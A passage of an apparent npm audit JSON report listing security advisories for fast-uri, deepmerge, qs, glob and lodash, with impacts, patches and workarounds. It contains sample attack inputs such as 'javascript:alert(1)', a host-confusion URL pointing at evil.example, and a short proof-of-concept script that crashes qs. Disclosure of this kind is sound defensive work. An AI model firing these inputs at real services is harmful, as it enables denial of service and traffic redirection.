+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-xhq7-xmqj-769h\n- https://nvd.nist.gov/vuln/detail/CVE-2026-110095\n- https://github.com/fastify/fast-uri/commit/048bbd0a252971be86d6579f0dfc87f8de5b9c47\n- https://github.com/fastify/fast-uri/commit/52774a5c35df36b0bbe439cd4c12c3dc0e50e3b9\n- https://github.com/fastify/fast-uri/commit/7c19f8b97ec51f1f20b4e3d9d5820cb8d5176058\n- https://github.com/fastify/fast-uri/commit/9eb8759a9825c046f57f7f695f1944bc39b88abd\n- https://github.com/fastify/fast-uri/commit/acc5c5d60c4209571789496e1732468911c7e12a\n- https://github.com/fastify/fast-uri/commit/b110a3571c37dfcf9d1c72ce2e2e178c78d1a424\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.8\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.9\n- https://github.com/fastify/fast-uri/releases/tag/v4.2.3\n- https://github.com/advisories/GHSA-xhq7-xmqj-769h",
+      "created": "2026-10-23T21:39:34.000Z",
+      "id": 1243101,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri`'s `normalize()` and `serialize()` apply RFC 3986 dot-segment removal (`remove_dot_segments`) to the path of a relative-path reference. RFC 3986 section 5.2.4 defines that algorithm only for the merged target path during resolution, not for the reference itself, so applied to the reference it drops leading `..` segments and can turn a document-relative reference into a root-relative one.\n\nFor example, `normalize('a/../b')` returns `/b` and `normalize('../x')` returns `x`, so `resolve(base, normalize(ref))` points at a different resource than `resolve(base, ref)`, and `equal()` treats distinct references as the same.\n\nApplications that normalize attacker-supplied or user-supplied relative references and then resolve them, or use them as cache, deduplication, or authorization keys, can have a reference escape its intended directory and point at a different resource.\n\n### Patches\n\nUpgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.\n\n### Workarounds\n\nDo not normalize a relative reference before resolving it. Resolve it against the absolute base first, then normalize the absolute result.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to improper path equivalence in relative reference normalization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-110095"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=3.0.0 <3.1.9",
+      "github_advisory_id": "GHSA-xhq7-xmqj-769h",
+      "recommendation": "Upgrade to version 3.1.9 or later",
+      "patched_versions": ">=3.1.9",
+      "updated": "2026-10-23T21:39:38.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-41"
+      ],
+      "url": "https://github.com/advisories/GHSA-xhq7-xmqj-769h"
+    },
+    "1243104": {
+      "findings": [
+        {
+          "version": "3.1.8",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-wjr9-j795-jxcr\n- https://nvd.nist.gov/vuln/detail/CVE-2026-110180\n- https://github.com/fastify/fast-uri/commit/58c183d0b168ad87f98773266444ce1f6375803a\n- https://github.com/fastify/fast-uri/commit/ddfc6a51122dfce0365655f04479fc3adb7f6b3c\n- https://github.com/fastify/fast-uri/commit/f6d46dfeab025d0c440485f4ae29fa4f14707646\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.8\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.9\n- https://github.com/fastify/fast-uri/releases/tag/v4.2.3\n- https://github.com/advisories/GHSA-wjr9-j795-jxcr",
+      "created": "2026-10-23T21:37:59.000Z",
+      "id": 1243104,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri` versions `>= 2.4.2, <= 2.4.7`, `>= 3.1.3, <= 3.1.8`, and `>= 4.0.1, <= 4.2.2` can silently rewrite the host of an HTTP-family URL (`http`, `https`, `ws`, `wss`, or any scheme with `domainHost: true`). For those schemes `canonicalizeHost()` passes the parsed host to the WHATWG `URL` parser and adopts its `.hostname` without checking that the parser read the whole input as a host. RFC 3986 permits `@` inside the host group and the WHATWG parser strips TAB, LF, and CR, so the authority `fast-uri` reports is rewritten by that second parser with no `error` set: data before an `@` is dropped and whitespace is removed.\n\nFor example, `fast-uri` parses `http://a@b@evil.example/` to host `evil.example` (dropping the `b` segment), and a host containing a raw TAB, CR, or LF has those characters stripped. `equal()` then treats a whitespace-smuggled host as the same as the clean one, and `resolve()` rewrites the authority the same way.\n\nApplications that use `fast-uri` to enforce host-based policy (denylists, loopback filtering, redirect validation, outbound proxy routing) on one representation, such as the raw input, see a policy/use desync: the canonical host `fast-uri` returns differs from what was checked, and traffic can be steered to an unintended destination.\n\n### Patches\n\nUpgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.\n\n### Workarounds\n\nReject URIs whose authority contains more than one `@`, or contains TAB, CR, or LF, before calling `fast-uri`. Alternatively, treat any non-empty `parse(x).error` as fatal, and compare hosts only from the same `parse()` result.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to host confusion via unchecked WHATWG host canonicalization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-110180"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=3.1.3 <3.1.9",
+      "github_advisory_id": "GHSA-wjr9-j795-jxcr",
+      "recommendation": "Upgrade to version 3.1.9 or later",
+      "patched_versions": ">=3.1.9",
+      "updated": "2026-10-23T21:38:02.000Z",
+      "cvss": {
+        "score": 4.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-wjr9-j795-jxcr"
+    },
+    "1243107": {
+      "findings": [
+        {
+          "version": "3.1.8",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-333x-w4r6-6crp\n- https://nvd.nist.gov/vuln/detail/CVE-2026-110725\n- https://github.com/fastify/fast-uri/commit/39e6493c1356f30a0084171627eb266786e1620e\n- https://github.com/fastify/fast-uri/commit/a9b8d67353630aab053cd727cf629023dd018d2b\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.8\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.9\n- https://github.com/fastify/fast-uri/releases/tag/v4.2.3\n- https://github.com/advisories/GHSA-333x-w4r6-6crp",
+      "created": "2026-10-23T21:36:40.000Z",
+      "id": 1243107,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri`'s `serialize()`, `normalize()`, and `resolve()`, when called with the non-default option `reference: 'suffix'` on a reference that has no authority, emit a relative reference whose first path segment contains a bare colon without escaping it. RFC 3986 section 3.3 requires the first segment of a `path-noscheme` reference not to contain a colon, precisely because a bare colon makes the string reparse as an absolute URI with a scheme. `fast-uri`'s default serialization escapes that colon, but the suffix path does not.\n\nFor example, `normalize('javascript:alert(1)', { reference: 'suffix' })` returns `javascript:alert(1)`, which reparses as a live `javascript:` scheme; `data:` and `vbscript:` behave the same.\n\nApplications that serialize or normalize a relative reference with `reference: 'suffix'` and then treat the result as a URI can turn inert input into a live `javascript:`, `data:`, or `vbscript:` URL (a cross-site scripting vector), and `equal()` can conflate a scheme-bearing reference with a relative one. Exposure is limited to applications that use the non-default `reference: 'suffix'` option.\n\n### Patches\n\nUpgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.\n\n### Workarounds\n\nDo not use the `reference: 'suffix'` option on untrusted input. If suffix output is required, percent-encode a colon in the first path segment of the result before treating it as a URI.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to scheme injection via an unescaped first-segment colon in suffix references",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-110725"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=3.0.0 <3.1.9",
+      "github_advisory_id": "GHSA-333x-w4r6-6crp",
+      "recommendation": "Upgrade to version 3.1.9 or later",
+      "patched_versions": ">=3.1.9",
+      "updated": "2026-10-23T21:36:41.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-41",
+        "CWE-116"
+      ],
+      "url": "https://github.com/advisories/GHSA-333x-w4r6-6crp"
+    },
+    "1243505": {
+      "findings": [
+        {
+          "version": "4.3.1",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-93753\n- https://github.com/TehShrike/deepmerge/issues/273\n- https://github.com/TehShrike/deepmerge/blob/5b87756a5671635679001cbac72aa42f23472c81/index.js#L39-L60\n- https://www.vulncheck.com/advisories/deepmerge-through-4.3.1-prototype-poisoning-via-mergeobject\n- https://github.com/advisories/GHSA-gcqx-w48m-w2h4",
+      "created": "2026-09-18T18:31:44.000Z",
+      "id": 1243505,
+      "npm_advisory_id": null,
+      "overview": "deepmerge through 4.3.1 contains a prototype poisoning vulnerability in the mergeObject() function that fails to properly validate keys being written to target objects. Attackers can supply malicious source objects in merge operations to inject attacker-controlled properties into the returned object's prototype, causing applications to inherit unintended values when accessing properties without own-property checks.",
+      "reported_by": null,
+      "title": "deepmerge mergeObject() allows prototype poisoning of returned objects",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-93753"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "deepmerge",
+      "vulnerable_versions": ">=4.2.0 <=4.3.1",
+      "github_advisory_id": "GHSA-gcqx-w48m-w2h4",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2026-10-27T21:34:58.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-gcqx-w48m-w2h4"
+    },
+    "1243687": {
+      "findings": [
+        {
+          "version": "6.14.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-6pq8-jhm2-2vcw\n- https://nvd.nist.gov/vuln/detail/CVE-2026-110816\n- https://github.com/ljharb/qs/commit/a952e7519338ef0cfb25694a2988848f93333727\n- https://github.com/ljharb/qs/releases/tag/v6.16.1\n- https://github.com/advisories/GHSA-6pq8-jhm2-2vcw",
+      "created": "2026-10-27T16:10:55.000Z",
+      "id": 1243687,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`qs.stringify(obj, { arrayFormat: 'comma' })` throws an uncaught `TypeError: Cannot convert object to primitive value` when an array in `obj` contains an element that carries an own, non-callable `toString` property (for example `{ a: [ { toString: 'x' } ] }`). A remote, unauthenticated attacker who can influence an object that the application later re-serializes with the comma array format triggers the throw. In a service that lacks a synchronous error boundary around the serialization call, the uncaught exception crashes the worker process, producing a denial of service.\n\n## Root Cause\n\nWhen `arrayFormat: 'comma'` is selected, the comma branch collapses the whole array into a single value via `Array.prototype.join`, or, under `encodeValuesOnly: true`, maps each element through the value encoder before joining. Both paths perform an implicit string coercion (`ToPrimitive` with hint `\"string\"`) on each element. For an object whose own `toString` is a non-callable value, coercion skips the shadowed non-callable `toString`, falls through to `Object.prototype.valueOf` (which returns the object rather than a primitive), and throws. The comma branch runs this coercion before the per-element null and skip handling in the main loop, so nothing downstream can neutralize the hostile element, and the throw is never caught inside the library.\n\n```text\nlib/stringify.js  (comma-array branch)\n  line 152-154: obj = utils.maybeMap(obj, function (v) { return v == null ? v : encoder(v); });  // encodeValuesOnly path\n  line 156:     objKeys = [{ value: obj.length > 0 ? obj.join(',') || null : void undefined }];   // default comma path\nlib/utils.js\n  line 292:     string = String(str);   // value encoder coercion reached via the encodeValuesOnly path\n```\n\n## Impact\n\nPrerequisites: the application calls `qs.stringify` with `arrayFormat: 'comma'` (a documented, supported option) on an object whose shape can be influenced by attacker input. Attacker-controllable sources include `qs.parse(input, { allowPrototypes: true })`, which retains a `toString` segment (Express 4's default query parser, Express 5's `extended` query parser, and body-parser's `extended` urlencoded parser all set it), `qs.parse(input, { plainObjects: true })`, whose null-prototype elements throw even without a `toString` key (eg, `a[][b]=c`), and `JSON.parse` of a request body, which needs no qs parse option at all. No authentication or user interaction is required. Demonstrated capability: a single request forces an uncaught synchronous `TypeError` in the serialization call. In a naive single-process Node service with no synchronous error boundary, this crashes the process and takes the service offline (availability impact). Under a framework such as Express that traps synchronous handler throws, the plausible outcome is a per-request 500 rather than a full outage; that lower-impact case is noted but not the worst credible supported deployment. There is no confidentiality or integrity impact, no memory unsafety, and no prototype pollution.\n\n## Proof of Concept\n\n`Install qs at the affected version (for example 6.16.0) and run the following script with Node.js. No network setup is required; it demonstrates the throw in isolation.`\n\n```js\nvar qs = require('qs');\n\n// Source A: qs.parse with allowPrototypes retains the hostile toString segment\nqs.stringify(qs.parse('a[0][toString]=x', { allowPrototypes: true }), { arrayFormat: 'comma' });\n\n// Source B: a JSON request body, no qs parse option needed\nqs.stringify(JSON.parse('{\"a\":[{\"toString\":\"x\"}]}'), { arrayFormat: 'comma' });\n\n// Also affected: the encodeValuesOnly sub-path\nqs.stringify(JSON.parse('{\"a\":[{\"toString\":\"x\"}]}'), { arrayFormat: 'comma', encodeValuesOnly: true });\n```\n\n```text\nA default-join (allowPrototypes) => THREW: TypeError: Cannot convert object to primitive value\nB default-join (JSON.parse) => THREW: TypeError: Cannot convert object to primitive value\nC encodeValuesOnly path => THREW: TypeError: Cannot convert object to primitive value\nN2 callable toString => NO THROW; output=\"a=z\"\nN3 isBuffer vector (CVE-2026-82417) => NO THROW; output=\"a%5Bconstructor%5D%5BisBuffer%5D=x\"\nqs version: 6.16.0\n```\n\n## Attack Chain\n\n1. **Exposure:** A remote, unauthenticated request reaches an endpoint whose handler eventually serializes attacker-influenced data with `qs.stringify(obj, { arrayFormat: 'comma' })`.\n2. **Control:** The attacker supplies data that becomes `{ a: [ { toString: <non-callable value> } ] }`, either via `a[0][toString]=x` parsed with `allowPrototypes`, or via a JSON body `{\"a\":[{\"toString\":\"x\"}]}`.\n3. **Path:** In `stringify`, the primitive/buffer guard at `lib/stringify.js:134` is false for an array, so control reaches the comma branch at `lib/stringify.js:149`.\n4. **Guard:** On the `encodeValuesOnly` path, the closure `v == null ? v : encoder(v)` at `lib/stringify.js:152-154` passes only `null`/`undefined` through; a non-null object still reaches the encoder. The default path skips that closure entirely and reaches `obj.join(',')` at `lib/stringify.js:156` with no guard at all.\n5. **Primitive:** The element is coerced to a string (`Array.prototype.join`, or `String(str)` at `lib/utils.js:292`). `ToPrimitive` skips the non-callable own `toString`, `valueOf` returns the object, and a `TypeError` is thrown.\n6. **Result:** The uncaught synchronous exception propagates out of the serialization call, failing the request and, in a service without a synchronous error boundary, crashing the process (denial of service).\n\n## Bypass Evidence\n\nThis is a different element type on the code path CVE-2026-8723 (GHSA-q8mj-m7cp-5q26) patched, plus the default comma path, which that fix never covered. CVE-2026-8723 addressed a `TypeError` crash on `null`/`undefined` entries in the comma plus `encodeValuesOnly` path. Its fix (commit 21f80b3) wraps the encoder in `function (v) { return v == null ? v : encoder(v); }`, so it only passes `null` and `undefined` through. A non-null element with a hostile own `toString` fails the `v == null` test, so the encoder still runs and still throws; the encodeValuesOnly case (case C above) throws on the exact fixed code. The default comma path (`encodeValuesOnly` unset, the library default) never entered that fix at all: `git log -S \"obj.join(','\" -- lib/stringify.js` shows no security fix has ever touched the `obj.join(',')` line, and cases A and B throw with `encodeValuesOnly` unset. The related isBuffer hardening for CVE-2026-82417 (commit e83d321) is a different sink at the `lib/stringify.js:134` guard, which is never entered for the array element; the negative control `{a:{constructor:{isBuffer:'x'}}}` serializes cleanly. Disproof attempts that failed: a `valueOf`-only object does not throw (it serializes to `[object Object]`), confirming the trigger is an element with no callable `toString` (an own non-callable `toString`, or a null-prototype object with no `toString` at all, as `qs.parse` produces under `plainObjects`); nested arrays (`{\"a\":[[{\"toString\":\"x\"}]]}`) throw the same way; a callable `toString` serializes cleanly; and the default (non-comma) array format serializes cleanly, confirming the comma format is required. All positive and negative cases were reproduced on the exact published 6.16.0 artifact.\n\n## Affected Versions\n\n- `Ecosystem: npm`\n- `Package: qs`\n- `Confirmed affected range: >= 6.7.0, <= 6.16.0`\n- `Latest release checked: 6.16.0 (npm latest; git tag v6.16.0)`\n- `Fix status: fixed in 6.16.1 (a952e75)`\n\nThe `arrayFormat: 'comma'` join sink was introduced in qs 6.7.0, so 6.7.0 is the lower boundary; releases before 6.7.0 lack the sink. No released version fixes this vector, and the latest published release (6.16.0) reproduces the throw, so the closed upper bound `<= 6.16.0` covers every affected release. The `encodeValuesOnly` sub-path was added later, but the default comma-join vector already affects 6.7.0, so 6.7.0 governs the lower boundary.\n\n## Suggested Fix\n\nThe comma array serialization must not allow an implicit string coercion of an array element to throw an uncaught exception. Coercion of each comma element should be performed defensively (for example by wrapping the join and per-element encode so that a coercion failure is caught and handled), and this protection must cover both the default `obj.join(',')` path and the `encodeValuesOnly` encoder path, not only the previously patched `null`/`undefined` case. As an interim mitigation without a code change, applications can avoid `arrayFormat: 'comma'` when serializing data derived from untrusted input, sanitize parsed objects (avoid `allowPrototypes`/`plainObjects` on untrusted input and strip unexpected own properties), or wrap `qs.stringify` calls in a synchronous error boundary so a coercion failure cannot crash the process.\n\nReported by zx (GitHub: @manus-pi).\n\n---\n\n## Independent report by @Lucidsec\n\nThe following was reported separately, after this advisory, and is merged here as a duplicate.\n\n### Summary\n\nIn project [qs](https://github.com/ljharb/qs), in versions `>= 6.7.0, <= 6.16.0` (every version that supports `arrayFormat: 'comma'`), `qs.stringify` with `arrayFormat: 'comma'` can throw an uncaught `TypeError: Cannot convert object to primitive value` when an array element has a non-callable own `toString`. It is fixed in 6.16.1. Related: CWE-248 and CWE-704.\n\n### Technical Details\n\n`qs.stringify` with `arrayFormat: 'comma'` joins an array at `lib/stringify.js:156` via `obj.join(',')`. An element whose own `toString` is not callable makes `Array.prototype.join` throw. There is no type check and no catch on that path.\n\nA second path exists with `encodeValuesOnly`: at `lib/stringify.js:151-154`, `maybeMap` only skips `v == null`, then `lib/utils.js:292` does `String(str)` and throws the same `TypeError` (this second site exists since v6.11.1; before that, the same input throws at `join`).\n\nWho can trigger: someone who can shape an array element passed to `stringify`. The host must use non-default `arrayFormat: 'comma'`. Default `arrayFormat` `indices` does not fold arrays and is not affected. A parse-then-stringify path also needs `plainObjects: true` (null-prototype elements from `lib/parse.js:200`) or `allowPrototypes: true` (which Express 4's default query parser, Express 5's `extended` query parser, and body-parser's `extended` urlencoded parser all set). Default `qs.parse('a[0][toString]=x')` returns `{}` because the prototype guard drops `toString`. Direct JSON handed to `stringify` can supply `{\"a\":[{\"toString\":\"x\"}]}`.\n\nCause: the comma fold at `lib/stringify.js:149-156` collapses the array into a single value before the main loop at `lib/stringify.js:172-212`, so `skipNulls` and `strictNullHandling` only ever see the joined value, never individual elements. `isNonNullishPrimitive` / `isBuffer` at `lib/stringify.js:134` inspect the whole value, not each element. A normal object uses `Object.prototype.toString` and becomes `[object Object]`. An own non-callable `toString` is skipped, `valueOf` returns the object, and `join` throws. (The skipped TODO test at `test/stringify.js:684-689` uses a plain `{ b: 1 }` element, which does not throw; it covers the separate question of what comma format should output for object elements, not this crash.) Earlier comma crash fixes did not cover object elements.\n\n### Impact\n\nOne small input makes that serialization path throw a synchronous, catchable `TypeError`. Behind a framework error boundary (eg, a synchronous Express handler), the request fails with a 500 and the process survives. In a host with no error boundary (eg, a bare `http.createServer` handler), the uncaught exception exits the process (the client sees `ECONNRESET`). Availability only.\n\n### Proof of Concept\n\n<details>\n<summary>Show the proof of concept</summary>\n\nChecked on the latest commit that was checked: `07b1d4d82c8f9301c105ea4b94fa2302cfd6e8b4`. Still present. Demonstrated.\n\n- Payload `{\"a\":[{\"toString\":\"x\"}]}` throws at `lib/stringify.js:156`.\n- Baseline `{\"a\":[\"x\",\"y\"]}` returns 200 with body `a=x%2Cy`.\n- A plain object element stringifies to `a=%5Bobject%20Object%5D` and does not throw.\n- `encodeValuesOnly: true` throws via `utils.js:292`.\n- `plainObjects` parse plus comma throws.\n\n</details>\n\n### Suggested Fix\n\nBefore `join`, map elements with the existing primitive check; skip or replace non-primitives so `join` cannot throw. On the `encodeValuesOnly` path, do not send non-primitives into `String()`. Optionally guard `lib/utils.js:292`. Add new regression tests.",
+      "reported_by": null,
+      "title": "qs : qs.stringify with arrayFormat 'comma' throws an uncaught TypeError on array elements carrying a non-callable own toString (DoS)",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-110816"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "qs",
+      "vulnerable_versions": ">=6.7.0 <=6.16.0",
+      "github_advisory_id": "GHSA-6pq8-jhm2-2vcw",
+      "recommendation": "Upgrade to version 6.16.1 or later",
+      "patched_versions": ">=6.16.1",
+      "updated": "2026-10-29T02:22:33.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-704"
+      ],
+      "url": "https://github.com/advisories/GHSA-6pq8-jhm2-2vcw"
+    },
+    "1244013": {
+      "findings": [
+        {
+          "version": "10.4.5",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-glob/security/advisories/GHSA-3g3m-2fjr-6pw4\n- https://nvd.nist.gov/vuln/detail/CVE-2026-118773\n- https://github.com/isaacs/node-glob/commit/4682e8c9babee1b385202ede36389634e12076d7\n- https://github.com/isaacs/node-glob/releases/tag/v14.0.2\n- https://github.com/advisories/GHSA-3g3m-2fjr-6pw4",
+      "created": "2026-10-30T23:09:11.000Z",
+      "id": 1244013,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nIn glob 13.0.6, an aborted async walk rejects or emits an error but continues recursively reading directories in the background.\n\nThe root cause is that abort branches in src/walker.ts call cb() without returning. As a result, callers that rely on signal or AbortSignal.timeout() to bound glob traversal cost can still incur filesystem I/O and CPU work after the request has already been rejected.\n\n### Details\n\nThis was reproduced on glob v13.0.6 (commit e80cb38ae60d6cbff9e75f39032a994858994d35).\n\nThe README documents that the signal option cancels the glob walk. However, in src/walker.ts, the following methods call cb() when this.signal?.aborted is true but do not return:\n\n- GlobUtil.walkCB()\n- GlobUtil.walkCB2()\n- GlobUtil.walkCBSync()\n- GlobUtil.walkCB2Sync()\n\nExample vulnerable pattern:\n\nif (this.signal?.aborted) cb()\n\nBecause execution continues after cb(), the walker still reaches processor.processPatterns(), readdirCB(), and recursive walkCB2() calls.\n\nThe issue was directly demonstrated against v13.0.6. A source-history review shows the same missing-return pattern is present in tagged releases from v9.0.0 through v13.0.6.\n\nThe issue affects both glob() and globStream().\n\nRecommended fix:\nChange each abort branch to return immediately:\n\nif (this.signal?.aborted) return cb()\n\n### Proof of concept\n\nEnvironment:\n- Linux x86_64\n- Node.js v22.23.3\n- npm 10.9.9\n- glob 13.0.6\n\nReproduction steps:\n\n1. Install the affected package:\n   npm init -y\n   npm install glob@13.0.6\n\n2. Run the attached PoC:\n   node poc/abort-continues-work.mjs\n\nThe PoC aborts after the first readdir() call, waits briefly, and counts how many more directory reads happen after the promise has already rejected.\n\nObserved output on the vulnerable version:\n\n{\n  \"rejection\": \"Error: probe-abort\",\n  \"readdirCalls\": 1365,\n  \"readdirCallsAtReject\": 5,\n  \"readdirCallsAfterReject\": 1360\n}\n\nExpected behavior:\nreaddirCallsAfterReject should be 0.\n\nA second PoC using AbortSignal.timeout() also reproduces the issue:\n\n{\n  \"rejection\": \"TimeoutError: The operation was aborted due to timeout\",\n  \"readdirCalls\": 133,\n  \"readdirCallsAtReject\": 1,\n  \"readdirCallsAfterReject\": 132\n}\n\nThe same test against a patched build with return cb() in the four abort branches stops immediately:\n\n{\n  \"readdirCalls\": 1,\n  \"readdirCallsAtReject\": 1,\n  \"readdirCallsAfterReject\": 0\n}\n\n### Impact\n\nThis is an availability issue.\n\nApplications that expose globbing over attacker-influenced patterns or attacker-controlled directory trees and use AbortSignal / AbortSignal.timeout() as a traversal budget can still perform significant filesystem I/O and CPU work after a request has already timed out or been canceled.\n\nRepeated timed-out requests can stack background glob walks and degrade worker throughput or service availability.\n\nNo confidentiality or integrity impact was observed.",
+      "reported_by": null,
+      "title": "Glob: AbortSignal cancellation bypass allows post-timeout filesystem traversal",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-118773"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "glob",
+      "vulnerable_versions": ">=9.0.0 <=14.0.1",
+      "github_advisory_id": "GHSA-3g3m-2fjr-6pw4",
+      "recommendation": "Upgrade to version 14.0.2 or later",
+      "patched_versions": ">=14.0.2",
+      "updated": "2026-10-30T23:09:15.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-3g3m-2fjr-6pw4"
+    },
+    "1244531": {
+      "findings": [
+        {
+          "version": "4.17.21",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg\n- https://nvd.nist.gov/vuln/detail/CVE-2025-13465\n- https://github.com/lodash/lodash/commit/edadd452146f7e4bad4ea684e955708931d84d81\n- https://cert-portal.siemens.com/productcert/html/ssa-253495.html\n- https://security.access.redhat.com/data/csaf/v2/vex/2025/cve-2025-13465.json\n- https://access.redhat.com/errata/RHSA-2026:41928\n- https://access.redhat.com/errata/RHSA-2026:41064\n- https://access.redhat.com/errata/RHSA-2026:40984\n- https://access.redhat.com/errata/RHSA-2026:40945\n- https://access.redhat.com/errata/RHSA-2026:40138\n- https://access.redhat.com/errata/RHSA-2026:40118\n- https://access.redhat.com/errata/RHSA-2026:3962\n- https://access.redhat.com/errata/RHSA-2026:3960\n- https://access.redhat.com/errata/RHSA-2026:3958\n- https://access.redhat.com/errata/RHSA-2026:3884\n- https://access.redhat.com/errata/RHSA-2026:3874\n- https://access.redhat.com/errata/RHSA-2026:3870\n- https://access.redhat.com/errata/RHSA-2026:3869\n- https://access.redhat.com/errata/RHSA-2026:3825\n- https://access.redhat.com/errata/RHSA-2026:3782\n- https://access.redhat.com/errata/RHSA-2026:3710\n- https://access.redhat.com/errata/RHSA-2026:36882\n- https://access.redhat.com/errata/RHSA-2026:36651\n- https://access.redhat.com/errata/RHSA-2026:34608\n- https://access.redhat.com/errata/RHSA-2026:3422\n- https://access.redhat.com/errata/RHSA-2026:34100\n- https://cna.openjsf.org/security-advisories.html\n- https://bugzilla.redhat.com/show_bug.cgi?id=2431740\n- https://access.redhat.com/security/cve/CVE-2025-13465\n- https://access.redhat.com/errata/RHSA-2026:9848\n- https://access.redhat.com/errata/RHSA-2026:8229\n- https://access.redhat.com/errata/RHSA-2026:8218\n- https://access.redhat.com/errata/RHSA-2026:6567\n- https://access.redhat.com/errata/RHSA-2026:6497\n- https://access.redhat.com/errata/RHSA-2026:6288\n- https://access.redhat.com/errata/RHSA-2026:6192\n- https://access.redhat.com/errata/RHSA-2026:57487\n- https://access.redhat.com/errata/RHSA-2026:5636\n- https://access.redhat.com/errata/RHSA-2026:5633\n- https://access.redhat.com/errata/RHSA-2026:4782\n- https://access.redhat.com/errata/RHSA-2026:4630\n- https://access.redhat.com/errata/RHSA-2026:4467\n- https://access.redhat.com/errata/RHSA-2026:4466\n- https://access.redhat.com/errata/RHSA-2026:4423\n- https://access.redhat.com/errata/RHSA-2026:41944\n- https://access.redhat.com/errata/RHSA-2026:41941\n- https://access.redhat.com/errata/RHSA-2026:24331\n- https://access.redhat.com/errata/RHSA-2026:21658\n- https://access.redhat.com/errata/RHSA-2026:2149\n- https://access.redhat.com/errata/RHSA-2026:2148\n- https://access.redhat.com/errata/RHSA-2026:2147\n- https://access.redhat.com/errata/RHSA-2026:2145\n- https://access.redhat.com/errata/RHSA-2026:2119\n- https://access.redhat.com/errata/RHSA-2026:2078\n- https://access.redhat.com/errata/RHSA-2026:20088\n- https://access.redhat.com/errata/RHSA-2026:20042\n- https://access.redhat.com/errata/RHSA-2026:19712\n- https://access.redhat.com/errata/RHSA-2026:18868\n- https://access.redhat.com/errata/RHSA-2026:18480\n- https://access.redhat.com/errata/RHSA-2026:1845\n- https://access.redhat.com/errata/RHSA-2026:17469\n- https://access.redhat.com/errata/RHSA-2026:15091\n- https://access.redhat.com/errata/RHSA-2026:14871\n- https://access.redhat.com/errata/RHSA-2026:14870\n- https://access.redhat.com/errata/RHSA-2026:14774\n- https://access.redhat.com/errata/RHSA-2026:13829\n- https://access.redhat.com/errata/RHSA-2026:13548\n- https://access.redhat.com/errata/RHSA-2026:13542\n- https://access.redhat.com/errata/RHSA-2026:11414\n- https://access.redhat.com/errata/RHSA-2026:33371\n- https://access.redhat.com/errata/RHSA-2026:33154\n- https://access.redhat.com/errata/RHSA-2026:3087\n- https://access.redhat.com/errata/RHSA-2026:2990\n- https://access.redhat.com/errata/RHSA-2026:2984\n- https://access.redhat.com/errata/RHSA-2026:2926\n- https://access.redhat.com/errata/RHSA-2026:2900\n- https://access.redhat.com/errata/RHSA-2026:2819\n- https://access.redhat.com/errata/RHSA-2026:2818\n- 